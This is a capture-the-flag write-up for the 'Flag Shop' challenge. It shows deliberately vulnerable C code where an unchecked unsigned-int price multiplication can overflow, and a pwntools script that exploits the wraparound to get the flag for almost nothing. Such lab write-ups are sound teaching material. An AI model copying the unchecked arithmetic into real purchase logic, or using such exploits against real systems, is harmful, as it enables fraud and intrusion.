# Flag Shop

| Difficulty | Points |
| ---------- | ------ |
| Easy       | 150    |

## Description

> I'm only selling 1 product and that's flags! Please make sure you calculate how much money you have before coming here.

> `34.126.175.135:8001`

{% file src="../../../.gitbook/assets/chall" %}

{% file src="../../../.gitbook/assets/chall.c" %}

## Solution

### TL;DR

1. Perform Integer Overflow to overflow `pay_price` to be < 100(balance).

### Analysis

{% tabs %}
{% tab title="chall.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

int flag_price = 420;
unsigned int balance = 100;

void menu_options(){
    puts("\nOptions:");
    puts("1. Buy flag");
    puts("2. Exit\n");
    return;
}

void purchase(){
    unsigned int quantity;
    unsigned int pay_price;
    FILE* ptr;
    char c;
    puts("How many flags do you want to purchase?");
    scanf("%u",&quantity);
    if (quantity < 1) {
        puts("Here are your imaginary flags:");
        return;
    }
    pay_price = flag_price * quantity;
    if (pay_price <= balance) {
        balance -= pay_price;
        if (quantity > 1) {
            puts("You don't have to flex how rich you are...");
        }
        ptr = fopen("flag.txt","r");

        if (ptr == NULL) {
            puts("Missing file?");
        }
        c = fgetc(ptr);
        while (c != EOF) {
            printf("%c",c);
            c = fgetc(ptr);
        }
        fclose(ptr);
    } else {
        puts("You do not have enough money!");
    }
    return;
}

int main(){
    unsigned int user_input;
    puts("Welcome to my flag shop!\nBuy anything from flags, to flags!");
    while (1){
        menu_options();
        printf("<<< ");
        scanf("%u",&user_input);
        if (user_input == 1){
            purchase();
        } else {
            printf("Come again!");
            exit(0);
        }
    }
   return 0;
}

```
{% endtab %}
{% endtabs %}

Program is pretty simple and limited with what you can do, so it is pretty straightforward.

The only option you have is to exit or provide the number of flags you want to buy, so our vulnerability is in the number of flags we provide.

We can see that our input is placed into the `quantity` variable, then the program calculates `pay_price = flag_price * quantity;`, and then checks if our balance is more than `pay_price`.

The thing to note is that the `pay_price` variable is assigned a type of `unsigned int` as seen at the start of the `purchase` function.

```c
    unsigned int pay_price;
```

This means that the value of `pay_price` cannot go into the negative (unsigned), but the problem lies in where is doesn't check for how big the value of `pay_price` might get.

The `int` type has a maximum value that it can store, any number above that value would cause an `integer overflow`, where the number wraps around and gives a smaller number than intended.

{% hint style="info" %}
An `integer overflow` occurs when a variable tries to store a value more than it can store.

Let's say a variable can only store 1 byte, meaning 0xff (255) is the maximum value it can store.

Well, what happens if you try to store 0x100 (256) in the same variable? It will overflow and the value stored in the variable will now be **0**.

And if you try to store 0x101 (257) in the same variable, it will overflow and store the value **1** instead.

You can essentially think of this as an AND operator on the Least Significant Bits of the value, where **`max value of 0xff = value & 0xff`** (& represents bitwise AND operator).
{% endhint %}

Searching online for the maximum value of `int`, we find at [https://learn.microsoft.com/en-us/cpp/c-language/cpp-integer-limits?view=msvc-170](https://learn.microsoft.com/en-us/cpp/c-language/cpp-integer-limits?view=msvc-170):

> UINT\_MAX Maximum value for a variable of type unsigned int. 4294967295 (0xffffffff)

So we can essentially craft a script that loops through the numbers of flags we can purchase, making sure to account for our integer overflow, and loop through till our `pay_price` <= 100.

{% tabs %}
{% tab title="solve.py" %}
```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./chall',checksec=False)
# p = elf.process()
url,port = "localhost", 8001
p = remote(url,port)

max_int = 0xffffffff # max for unsigned int https://learn.microsoft.com/en-us/cpp/c-language/cpp-integer-limits?view=msvc-170
flag_price = 420

p.clean()
p.sendline(b'1')

max_quantity = max_int // flag_price
quantity = max_quantity + 1
expected_price = (quantity)*flag_price % (max_int+1)
print("Finding the right quantity. This might take awhile...")
while expected_price > 100:
	quantity = (quantity + (max_quantity + 1)) % (max_int+1)
	expected_price = ((quantity)*flag_price) % (max_int+1)

print(f"{expected_price=}")
print(f"{quantity=}")

p.clean()
p.sendline(str(quantity).encode())

for _ in range(2):
	print(p.recvline())

p.close()
```
{% endtab %}
{% endtabs %}

